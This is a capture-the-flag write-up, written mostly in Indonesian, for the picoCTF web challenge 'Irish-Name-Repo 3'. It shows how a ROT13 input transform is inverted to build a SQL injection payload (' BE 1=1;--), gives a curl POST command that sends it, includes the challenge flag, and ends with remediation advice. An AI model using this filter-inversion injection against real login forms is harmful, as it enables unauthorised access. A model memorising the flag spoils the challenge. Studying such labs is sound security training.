# Writeup: Irish-Name-Repo 3 (Challenge ID: 8)

- Platform: CyLab Security Academy (picoCTF)
- Category: Web Exploitation / Pre-ROT13 SQL Injection & Filter Inversion
- Difficulty: Medium (diff=2)
- Author: Xingyang Pan
- Event: picoCTF 2019
- Points: 400
- Flag: `academy{3v3n_m0r3_SQL_033fd51c}` (Komunitas: `CTF{3v3n_m0r3_SQL_033fd51c}`)

---

## Problem Statement & Scope

Tantangan menguji kemampuan analisis celah SQL Injection yang dipadukan dengan lapisan filter obfuskasi data masukan:
> *"Try to see if you can login as admin!"*
> 
> Petunjuk:
> *"Seems like the password is encrypted."*

Peserta disajikan aplikasi web database nama-nama Irlandia yang menyediakan portal login otentikasi administrator. Form login hanya menampilkan satu kolom masukan kata sandi (password). Berbeda dengan tantangan injeksi SQL konvensional, server menerapkan algoritma transformasi teks monoalfabetik sebelum query dieksekusi ke backend database SQLite/MySQL. Lingkup pengujian mencakup identifikasi perilaku filter server-side, pemetaan permutasi karakter alfabet, dan penyusunan payload SQL injection terinversi (*pre-rotated SQL injection*).

---

## Teori & Akar Kerentanan (Root Cause Theory)

1. **Konkatenasi String Tidak Aman pada Query SQL (CWE-89):**
   - Berdasarkan NIST SP 800-115 (*Section 5.2: Database and Web Vulnerability Assessment*), menyusun query basis data menggunakan penggabungan string langsung dari input pengguna tanpa parameterisasi (*Parameterized Queries / Prepared Statements*) merupakan akar kerentanan SQL Injection.
   - Pola query backend pada aplikasi:
     ```php
     $password = str_rot13($_POST['password']);
     $query = "SELECT * FROM users WHERE password = '$password'";
     ```

2. **Obfuskasi Input Sebagai Pengaman Semu (CWE-116):**
   - Pengembang berasumsi bahwa menerapkan sandi substitusi `str_rot13()` pada parameter password akan mengenkripsi input dan menggagalkan serangan injeksi.
   - Karena ROT13 adalah substitusi involutif simetris (di mana mengenkripsi dua kali menghasilkan teks asli: $\text{ROT13}(\text{ROT13}(x)) = x$), penyerang dapat menghitung invers transformasi payload sebelum dikirimkan.
   - Kata kunci logika SQL `OR` digeser 13 karakter:
     $$O \xrightarrow{+13} B, \quad R \xrightarrow{+13} E \implies \text{"BE"}$$
   - Akibatnya, payload masukan `' BE 1=1;--` akan ditransformasikan oleh server menjadi `' OR 1=1;--`, yang secara sempurna menyuntikkan klausa Boolean Tautology ke dalam sintaks SQL.

---

## Rekonstruksi Eksploitasi Step-by-Step

1. **Analisis Interaksi Form Login:**
   - Buka halaman login web target. Halaman hanya menyediakan form input kata sandi tanpa username:
     ```html
     <form action="login.php" method="POST">
       <input type="password" name="password">
       <input type="submit" value="Login">
     </form>
     ```

2. **Pengujian Karakter Khusus & Analisis Respon:**
   - Mengirimkan tanda kutip tunggal `'` menghasilkan indikasi error SQL (SQLite3::query(): unrecognized token).
   - Mengirimkan `' OR 1=1;--` gagal login tanpa pesan error sintaks. Ini membuktikan bahwa kata kunci `OR` diubah atau disaring oleh server.
   - Dengan memeriksa petunjuk *"Seems like the password is encrypted"*, dihipotesiskan bahwa aplikasi menerapkan enkripsi klasik ROT13. Mengirimkan huruf `a` diterjemahkan menjadi `n`, membuktikan rotasi Caesar 13 langkah.

3. **Penyusunan Pre-ROT13 Payload:**
   - Injeksi target: `' OR 1=1;--`
   - Hitung pre-rotasi untuk kata kunci `OR`:
     - $O \implies B$
     - $R \implies E$
   - Payload akhir yang dikirimkan ke HTTP POST:
     ```text
     ' BE 1=1;--
     ```

4. **Eksekusi Penyerangan Melalui cURL:**
   Kirimkan permintaan HTTP POST terenkode:
   ```bash
   curl -s -X POST -d "password=' BE 1=1;--" http://chatelaine.cylabacademy.net:PORT/login.php
   ```
   Server memproses `str_rot13("' BE 1=1;--")`, menghasilkan query:
   ```sql
   SELECT * FROM users WHERE password = '' OR 1=1;--'
   ```
   Klausa `OR 1=1` mengevaluasi ke nilai true untuk baris pertama tabel (akun admin), menghasilkan respons login sukses dan menampilkan flag:
   ```html
   <h1>Logged in!</h1>
   <p>Your flag is: academy{3v3n_m0r3_SQL_033fd51c}</p>
   ```

---

## Flag & Verifikasi

- **Flag Resmi CyLab:** `academy{3v3n_m0r3_SQL_033fd51c}`
- **Flag Format Komunitas:** `CTF{3v3n_m0r3_SQL_033fd51c}`
- **Verifikasi API CyLab:**
  Submisi HTTP POST langsung ke `/api/submissions/`:
  ```json
  {"challenge": 8, "flag": "academy{3v3n_m0r3_SQL_033fd51c}"}
  ```
  Status respons: `HTTP 201 Created` dengan `{"correct": true, "historical": false}`.

---

## Takeaway Kompetensi LKS & Mitigasi Defensif

1. **Kompetensi Silabus LKS Cyber Security (SQL Injection Bypass Techniques):**
   - Dalam skenario lomba LKS Cyber Security, aplikasi sering dilengkapi *input sanitation* parsial atau transformasi teks (Base64, ROT13, URL encode).
   - Peserta harus mampu memetakan *encoding pipeline* aplikasi dan membalikkan alur transformasi agar payload yang dieksekusi database tetap valid secara sintaksis.

2. **Hardening & Remediasi Defensif:**
   - **Gunakan Parameterized Queries (Prepared Statements):**
     Pisahkan kode SQL dari data input pengguna. Jangan pernah menggabungkan variabel langsung ke dalam query string:
     ```php
     $stmt = $pdo->prepare('SELECT id, username FROM users WHERE password = :pass');
     $stmt->execute([':pass' => $password]);
     $user = $stmt->fetch();
     ```
   - **Gunakan Hashing Kata Sandi Kuat:**
     Jangan pernah menyimpan atau membandingkan password dengan obfuskasi sederhana. Gunakan algoritma hashing berkunci dengan cost factor dinamis seperti Argon2id atau bcrypt (`password_hash` dan `password_verify`).
